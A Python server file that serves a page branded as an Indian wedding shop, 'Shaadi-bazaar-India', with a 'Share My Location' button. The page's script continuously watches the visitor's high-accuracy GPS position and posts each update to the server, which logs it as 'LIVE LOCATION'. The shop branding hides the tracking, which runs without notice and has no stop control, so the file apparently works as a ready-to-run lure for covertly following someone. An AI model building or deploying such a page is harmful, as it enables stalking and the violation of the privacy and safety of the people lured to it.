import os, json
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

PAGE = """<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
<meta name="theme-color" content="#4a1024">
<title>Shaadi-bazaar-India</title>
<style>
* { box-sizing: border-box; }
html, body {
  margin: 0; width: 100%; min-height: 100%;
  font-family: Georgia, serif;
  background: #4a1024; color: #f9e8bd;
}
body {
  min-height: 100vh; min-height: 100dvh;
  display: flex; align-items: center; justify-content: center;
  padding: 18px; overflow-x: hidden;
}
.page {
  position: relative;
  width: 100%; max-width: 430px;
  min-height: 570px;
  padding: 38px 22px;
  display: flex; flex-direction: column;
  align-items: center; justify-content: space-between;
  text-align: center; overflow: hidden;
  border: 2px solid #d5ad61;
  border-radius: 22px;
  background:
    radial-gradient(ellipse at 50% 45%, #8c3a4c 0%, #641d36 48%, #3c0c20 100%);
  box-shadow: 0 18px 55px #180610aa;
}
.page:before, .page:after {
  content: "✦  ❀  ✦  ❀  ✦";
  position: absolute; left: 0; right: 0;
  color: #e6c27b; font-size: 21px; letter-spacing: 9px;
  opacity: .8;
}
.page:before { top: 13px; }
.page:after { bottom: 13px; }
h1 {
  position: relative; z-index: 2;
  margin: 12px 0 0;
  font-size: clamp(27px, 7vw, 34px);
  color: #ffe5a2;
  text-shadow: 0 2px 12px #250711;
}
.art {
  width: 100%; height: 285px;
  position: relative;
  display: flex; align-items: center; justify-content: center;
}
.art:before {
  content: "❀";
  position: absolute; top: 4px; left: 12px;
  color: #f2d18b; font-size: 42px;
}
.art:after {
  content: "❀";
  position: absolute; bottom: 0; right: 12px;
  color: #f2d18b; font-size: 42px;
}
.dress {
  position: absolute; bottom: 12px;
  width: 150px; height: 225px;
  background: linear-gradient(145deg,#f7dca0,#a95b35 45%,#6f1835 75%,#f0c879);
  clip-path: polygon(42% 0,58% 0,65% 19%,77% 30%,100% 100%,0 100%,23% 30%,35% 19%);
  filter: drop-shadow(0 8px 9px #210712);
}
.dress:after {
  content: "✦ ❀ ✦ ❀ ✦";
  position: absolute; top: 90px; left: 12px;
  color: #ffe7a7; font-size: 19px; line-height: 2.3;
}
.crown {
  position: absolute; top: 13px;
  font-size: 38px; color: #f8d88e;
}
.ornament {
  position: absolute; width: 95px; height: 150px;
  border: 2px solid #e9c77f; border-radius: 50%;
  opacity: .55;
}
.ornament.left { left: 0; transform: rotate(-25deg); }
.ornament.right { right: 0; transform: rotate(25deg); }
button {
  position: relative; z-index: 2;
  width: 100%; max-width: 310px; height: 58px;
  border: 1px solid #fff0c3; border-radius: 14px;
  background: linear-gradient(135deg,#ffe6a5,#c9953e);
  color: #4a1024; font-size: 17px;
  font-family: Arial, sans-serif; font-weight: 800;
  box-shadow: 0 6px 18px #1b061099;
  touch-action: manipulation;
}
button:disabled { opacity: .7; }
</style>
</head>
<body>
<main class="page">
  <h1>Shaadi-bazaar-India</h1>
  <div class="art" aria-hidden="true">
    <div class="ornament left"></div>
    <div class="ornament right"></div>
    <div class="crown">✧</div>
    <div class="dress"></div>
  </div>
  <button id="share">Share My Location</button>
</main>
<script>
const button = document.getElementById("share");

let watchId = null;
let sending = false;

button.addEventListener("click", function () {

  if (watchId !== null) return;

  if (!navigator.geolocation) {
    alert("Location is not supported by this browser.");
    return;
  }

  watchId = navigator.geolocation.watchPosition(

    async function (pos) {

      if (sending) return;
      sending = true;

      const data = {
        latitude: pos.coords.latitude,
        longitude: pos.coords.longitude,
        accuracy: pos.coords.accuracy,
        time: new Date().toISOString()
      };

      try {
        await fetch("/location", {
          method: "POST",
          headers: {"Content-Type": "application/json"},
          body: JSON.stringify(data)
        });

      } catch (error) {
        console.error("Location update failed:", error);

      } finally {
        sending = false;
      }
    },

    function (err) {
      console.error("Location error:", err.message);
    },

    {
      enableHighAccuracy: true,
      maximumAge: 0,
      timeout: 20000
    }
  );
});</script>
</body>
</html>
""".encode("utf-8")

class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path.split("?")[0] == "/favicon.ico":
            self.send_response(204)
            self.end_headers()
            return
        if self.path.split("?")[0] != "/":
            self.send_error(404)
            return
        self.send_response(200)
        self.send_header("Content-Type", "text/html; charset=utf-8")
        self.send_header("Content-Length", str(len(PAGE)))
        self.send_header("Cache-Control", "no-store")
        self.end_headers()
        self.wfile.write(PAGE)

    def do_HEAD(self):
        self.send_response(200)
        self.send_header("Content-Length", str(len(PAGE)))
        self.end_headers()

    def do_POST(self):
        if self.path != "/location":
            self.send_error(404)
            return
        try:
            size = int(self.headers.get("Content-Length", "0"))
            if size <= 0 or size > 10000:
                self.send_error(400)
                return
            data = json.loads(self.rfile.read(size))
            lat, lon = float(data["latitude"]), float(data["longitude"])
            if not (-90 <= lat <= 90 and -180 <= lon <= 180):
                self.send_error(400)
                return
            print("LIVE LOCATION:", json.dumps(data), flush=True)
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b"OK")
        except Exception:
            self.send_error(400)

port = int(os.environ.get("PORT", "8000"))
server = ThreadingHTTPServer(("0.0.0.0", port), Handler)
print("Server running on", port, flush=True)
server.serve_forever()

